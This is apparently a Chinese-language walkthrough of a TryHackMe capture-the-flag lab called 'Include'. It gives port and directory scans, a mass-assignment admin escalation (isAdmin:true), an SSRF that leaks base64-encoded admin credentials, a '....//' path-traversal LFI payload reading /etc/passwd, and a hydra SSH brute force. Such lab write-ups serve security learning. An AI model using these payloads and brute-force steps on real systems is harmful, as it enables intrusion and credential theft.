# Include

端口扫描

```shell
sudo nmap --min-rate 10000 -p- 10.10.239.116

PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
110/tcp   open  pop3
143/tcp   open  imap
993/tcp   open  imaps
995/tcp   open  pop3s
4000/tcp  open  remoteanything
50000/tcp open  ibm-db2
```

详细端口扫描

```shell
sudo nmap -sT -sV -sC -O -p22,25,110,143,993,995,4000,5000 10.10.239.116

PORT     STATE  SERVICE  VERSION
22/tcp   open   ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f8:28:7b:f2:5d:8a:f2:50:71:50:15:ad:f6:88:86:f3 (RSA)
|   256 ad:7c:bc:39:fc:19:15:b5:2c:5e:bb:3c:1d:dc:28:7b (ECDSA)
|_  256 b2:c3:44:88:6c:6d:10:31:5d:9d:a7:53:3e:f0:26:af (ED25519)
25/tcp   open   smtp     Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_smtp-commands: mail.filepath.lab, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
110/tcp  open   pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_pop3-capabilities: AUTH-RESP-CODE PIPELINING RESP-CODES UIDL CAPA SASL STLS TOP
|_ssl-date: TLS randomness does not represent time
143/tcp  open   imap     Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_imap-capabilities: ID OK more IDLE have STARTTLS ENABLE post-login listed LITERAL+ Pre-login LOGIN-REFERRALS capabilities IMAP4rev1 LOGINDISABLEDA0001 SASL-IR
|_ssl-date: TLS randomness does not represent time
993/tcp  open   ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_imap-capabilities: ID OK more IDLE have post-login ENABLE listed IMAP4rev1 LITERAL+ Pre-login LOGIN-REFERRALS AUTH=LOGINA0001 AUTH=PLAIN capabilities SASL-IR
995/tcp  open   ssl/pop3 Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE PIPELINING RESP-CODES UIDL CAPA SASL(PLAIN LOGIN) USER TOP
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
4000/tcp open   http     Node.js (Express middleware)
|_http-title: Sign In
50000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: System Monitoring Portal
```

目录扫描

```shell
sudo dirsearch -u 10.10.239.116:4000

301 -  177B  - /fonts  ->  /fonts/                               
301 -  179B  - /images  ->  /images/                             
302 -   29B  - /index  ->  /signin                               
302 -   29B  - /signout  ->  /signin                             
302 -   29B  - /signout/  ->  /signin                                   
```

```shell
sudo dirsearch -u 10.10.239.116:50000
                                    
302 -    1KB - /dashboard.php  ->  login.php                     
301 -  328B  - /javascript  ->  http://10.10.239.116:50000/javascript/
200 -  824B  - /login.php                                        
302 -    0B  - /logout.php  ->  index.php                                                       
302 -    0B  - /profile.php  ->  login.php                
200 -  633B  - /templates/                                       
301 -  327B  - /templates  ->  http://10.10.239.116:50000/templates/
301 -  325B  - /uploads  ->  http://10.10.239.116:50000/uploads/ 
200 -  461B  - /uploads/
```

打开10.10.239.116:4000和10.10.239.116:50000两个网站

其中10.10.239.116:4000可以使用游客账号登录

![image-20250122213211119](C:\Users\杨力\AppData\Roaming\Typora\typora-user-images\image-20250122213211119.png)

添加信息isAdmin:true之后，导航栏出现了新的api和setting选项

![image-20250122213535153](C:\Users\杨力\AppData\Roaming\Typora\typora-user-images\image-20250122213535153.png)

![image-20250122213614994](C:\Users\杨力\AppData\Roaming\Typora\typora-user-images\image-20250122213614994.png)

看起来setting是在获取获取图片的url，我们可以尝试将api放入其中，看看会不会获取什么信息，幸运的是我们获取到了一段信息

```
eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=

{"ReviewAppUsername":"admin","ReviewAppPassword":"admin@!!!","SysMonAppUsername":"administrator","SysMonAppPassword":"S$9$qk6d#**LQU"}
```

我们拿到了管理员的账号密码

去10.10.239.116:50000登录

进入之后我们查看页面，没什么发现，我们查看源代码，看到一张图片的地址，点击之后，它跳转到了10.10.239.116:50000/profile/img=profile.img

我们猜测其存在LFI漏洞，经过尝试我们发现有效payload

```
http://10.10.239.116:50000/profile.php?img=....//....//....//....//....//....//....//....//....//etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tryhackme:x:1001:1001:,,,:/home/tryhackme:/bin/bash
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
postfix:x:114:121::/var/spool/postfix:/usr/sbin/nologin
dovecot:x:115:123:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:116:124:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
joshua:x:1002:1002:,,,:/home/joshua:/bin/bash
charles:x:1003:1003:,,,:/home/charles:/bin/bash
```

看到用户名之后我们可以尝试使用ssh登录

```
hydra -l charles -P /usr/share/wordlists/fasttrack.txt 10.10.239.116 ssh

[22][ssh] host: 10.10.239.116   login: charles   password: 123456

ssh charles@10.10.239.116
```

登录拿到flag